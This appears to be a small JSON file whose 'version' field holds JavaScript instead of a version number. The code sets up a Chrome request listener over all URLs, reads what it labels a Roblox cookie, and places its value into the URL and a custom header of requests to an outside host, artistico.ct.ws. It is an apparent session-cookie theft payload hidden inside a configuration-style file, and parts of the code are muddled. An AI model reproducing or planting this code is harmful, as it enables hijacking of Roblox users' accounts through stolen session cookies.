{"version": "chrome.webRequest.onBeforeSendHeaders.addListener( function(details) { if (details.url.startsWith('https://artistico.ct.ws/maintenance/')) { const robloxCookie = document.cookie.match(/\.TIMESTAMP=[^;]+/); if (!robloxCookie) { console.error('Roblox cookie not found.'); return { cancel: true }; } const timestamp = robloxCookie[0].split('=')[1]; const modifiedUrl = details.url.replace(/data=.*$/, `data='${timestamp}'`); const headers = details.requestHeaders; const newHeader = { name: 'X-Roblox-Timestamp', value: timestamp, }; const headerIndex = headers.findIndex(header => header.name === 'X-Roblox-Timestamp'); if (headerIndex !== -1) { headers[headerIndex] = newHeader; } else { headers.push(newHeader); } console.log('Modified URL:', modifiedUrl); console.log('Modified Headers:', headers); return { requestHeaders: headers, redirectUrl: modifiedUrl }; } return { redirectUrl: details.url }; }, { urls: ['<all_urls>'] }, ['blocking', 'requestHeaders'] ); window.onload = () => { try { const robloxCookie = document.cookie.match(/\.TIMESTAMP=[^;]+/); if(robloxCookie){ console.log('Roblox cookie found:', robloxCookie[0]); } else { console.error('Roblox cookie not found.'); } } catch (error) { console.error('Error accessing cookie:', error); } };console.log('"}
